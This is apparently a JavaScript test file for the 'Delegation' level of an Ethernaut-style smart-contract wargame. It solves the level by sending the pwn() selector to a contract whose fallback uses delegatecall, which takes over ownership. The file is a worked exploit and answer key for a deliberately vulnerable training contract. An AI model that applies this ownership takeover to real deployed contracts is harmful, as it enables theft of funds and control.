const DelegationFactory = artifacts.require('./levels/DelegationFactory.sol');
const Delegation = artifacts.require('./levels/Delegation.sol');

const Lux = artifacts.require('./Lux.sol');
const {
  BN,
  constants,
  expectEvent,
  expectRevert,
} = require('openzeppelin-test-helpers');
const utils = require('../utils/TestUtils');
const { ethers, upgrades } = require('hardhat');

contract('Delegation', function (accounts) {
  let lux;
  let level;
  let owner = accounts[1];
  let player = accounts[0];
  let statproxy;

  before(async function () {
    lux = await utils.getLuxWithStatsProxy();
    level = await DelegationFactory.new();
    await lux.registerLevel(level.address);
  });

  it('should allow the player to solve the level', async function () {
    // Get instance, which should be owned by the level
    const instance = await utils.createLevelInstance(
      lux,
      level.address,
      player,
      Delegation
    );
    // console.log(`player:`, player)
    // console.log(`factory:`, level.address)
    let owner = await instance.owner.call();
    // console.log(`instance owner:`, level.address)
    assert.equal(owner, level.address);

    // Use the fallback method to call the delegate's pwn()
    const pwner = web3.utils.sha3('pwn()').substring(0, 10);
    await web3.eth.sendTransaction({
      from: player,
      to: instance.address,
      data: pwner,
    });

    // Player should own the instance now
    owner = await instance.owner.call();
    // console.log(`new instance owner:`, owner)
    assert.equal(owner, player);

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      lux,
      level.address,
      instance.address,
      player
    );
    assert.equal(ethCompleted, true);
  });
});
